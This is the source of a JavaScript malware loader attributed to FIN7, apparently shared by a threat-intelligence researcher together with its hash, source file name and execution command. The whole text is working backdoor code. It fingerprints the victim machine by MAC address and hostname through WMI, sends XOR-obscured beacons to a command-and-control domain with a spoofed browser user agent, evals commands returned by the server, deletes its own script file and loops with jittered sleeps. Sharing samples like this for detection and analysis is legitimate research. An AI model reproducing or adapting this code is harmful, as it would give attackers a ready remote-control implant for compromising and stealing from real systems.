// @VK_INTEL
// FIN7 JS LOADER
// MD5: 98abcb64df23d353cc120213d5353bf3
// 2-25_P_Berger.xlsb   
// Execution:-> Contacts\mswmex28.exe //E:jscript %LOCALAPPDATA%\Temp\querylog.txt


function anonymous() {
    var ehexasogm = "jygypywme=";
    var imfanymumiqr = "string";
    var ehxigejimjig = "request";
    var owyvunibfe = "show_ico";
    var unosamad = "decrypt";
    var yvcuklembodsyn = "POST";
    var vfyzebmacehy = "POST";
    var ndybpufanxotqi = "";
    var fcozufynvafd = "Scripting.FileSystemObject";
    var vqalzukrafu = "";
    var fhosvuxgobridl = "_";
    var ydelrareci = "";
    var egecoregrin = "get_image";
    var awikdibevry = "images";
    var gisuntyne = "&id=";
    var ekudbazvydpoj = "fetch";
    var betfizume = "";
    var hpumhyzbijco = "MSXML2.ServerXMLHTTP";
    var vjibvelawi = "create_image";
    var izfuvexyl = "encrypt";
    var unedypillec = "WScript.Shell";
    var xisodoqiqa = "show_png";
    var kiqunkomyli = "&";
    var rluqrelegpeje = "show_jpg";
    var gbeqibynhicbe = "decrypt";
    var dbevwazokqap = "Content-Type";
    var mophastarino = "image";
    var bmifyfyqyhji = "https://mse-cdn.com/";
    var opcawyljojixk = "z";
    var azcufuhuhdyn = "create_logo";
    var bokfisuzcipy = "encrypt";
    var csyxkefwurfugu = "cdn";
    var ojcalaconc = "no";
    var fibhugcinfat = "group=zsoc&rt=0&secret=fghedf43dsSFvm03&time=120000&uid=";
    var tkogjuwogmib = "Unknown";
    var ujsibkirowme = "?request=content&id=";
    var hemoqirtomh = "?request=page";
    var ujjymykuw = "no";
    var mgambiluskabm = "/";
    var muripwubnurn = "application/x-www-form-urlencoded";
    var tetonjedfec = "winmgmts:root/CIMV2";
    var lyhloqeplo = "content";
    var duksiphewe = "%APPDATA%";
    var wewlowozrimo = "User-Agent";
    var rpiptonvezyh = "action=get_command";
    var ahredufmigralq = "";
    var ifepihorwond = "request";
    var gwuxwomexpybw = "string";
    var uhylozhunr = "encrypt";
    var uwrycibixek = "_";
    var crizapivukdo = "";

    function id() {
        var lrequest = wmi.ExecQuery("select * from Win32_NetworkAdapterConfiguration where ipenabled = true");
        var lItems = new Enumerator(lrequest);
        for (; !lItems.atEnd(); lItems.moveNext()) {
            var mac = lItems.item().macaddress;
            var dns_hostname = lItems.item().DNSHostName;
            if (typeof mac === gwuxwomexpybw && mac.length > 1) {
                if (typeof dns_hostname !== gwuxwomexpybw && dns_hostname.length < 1) {
                    dns_hostname = tkogjuwogmib;
                } else {
                    for (var i = 0; i < dns_hostname.length; i++) {
                        if (dns_hostname.charAt(i) > opcawyljojixk) {
                            dns_hostname = dns_hostname.substr(0, i) + uwrycibixek + dns_hostname.substr(i + 1);
                        }
                    }
                }
                return mac + uwrycibixek + dns_hostname;
            }
        }
    }

    function crypt_controller(type, request) {
        var encryption_key = ahredufmigralq;
        if (type === gbeqibynhicbe) {
            request = unescape(request);
            var request_split = request.split(")*(");
            request = request_split[0];
            encryption_key = request_split[1].split(ahredufmigralq);
        } else {
            encryption_key = (Math.floor(Math.random() * 9000) + 1000).toString().split(ahredufmigralq);
        }
        var output = new Array(request.length);
        for (var i = 0; i < request.length; i++) {
            var charCode = request.charCodeAt(i) ^ encryption_key[i % encryption_key.length].charCodeAt(0);
            output[i] = String.fromCharCode(charCode);
        }
        var result_string = output.join(ahredufmigralq);
        if (type === uhylozhunr) {
            result_string = result_string + ")*(" + encryption_key.join(ahredufmigralq);
            result_string = encodeURIComponent(result_string);
        }
        return result_string;
    }

    function get_path() {
        var pathes = [awikdibevry, mophastarino, lyhloqeplo, ekudbazvydpoj, csyxkefwurfugu];
        var files = [azcufuhuhdyn, egecoregrin, vjibvelawi, owyvunibfe, xisodoqiqa, rluqrelegpeje];
        var path = pathes[Math.floor(Math.random() * pathes.length)] + mgambiluskabm + files[Math.floor(Math.random() * files.length)];
        return bmifyfyqyhji + path;
    }

    function send_data(type, data, crypt) {
        try {
            var http_object = new ActiveXObject(hpumhyzbijco);
            if (type === ifepihorwond) {
                http_object.open(yvcuklembodsyn, get_path() + hemoqirtomh, false);
                data = ehexasogm + crypt_controller(uhylozhunr, fibhugcinfat + uniq_id + gisuntyne + id() + kiqunkomyli + data);
            } else {
                http_object.open(yvcuklembodsyn, get_path() + ujsibkirowme + uniq_id, false);
                if (crypt) {
                    data = crypt_controller(uhylozhunr, data);
                }
            }
            http_object.setRequestHeader(wewlowozrimo, "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/50.0");
            http_object.setRequestHeader(dbevwazokqap, muripwubnurn);
            http_object.setOption(2, 13056);
            http_object.send(data);
            return http_object.responseText;
        } catch (e) {
            return ojcalaconc;
        }
    }

    function main() {
        var ncommand = ahredufmigralq;
        ncommand = send_data(ifepihorwond, rpiptonvezyh, true);
        if (ncommand !== ojcalaconc) {
            try {
                eval(crypt_controller(gbeqibynhicbe, ncommand));
            } catch (e) {}
        }
        var random_knock = 120000 + (Math.floor(Math.random() * 16001) - 5000);
        WScript.Sleep(random_knock);
        main();
    }
    var first = false;
    var shell = new ActiveXObject(unedypillec);
    var fso = new ActiveXObject(fcozufynvafd);
    var wmi = GetObject(tetonjedfec);
    var uniq_id = new Date().getUTCMilliseconds();
    var app_path = shell.expandEnvironmentStrings(duksiphewe);
    if (fso.GetFolder(app_path).Type.length > 5) {
        fso.deleteFile(WScript.ScriptFullName);
        try {
            WScript.Sleep(120000);
            main();
        } catch (e) {
            main();
        }
    }
}
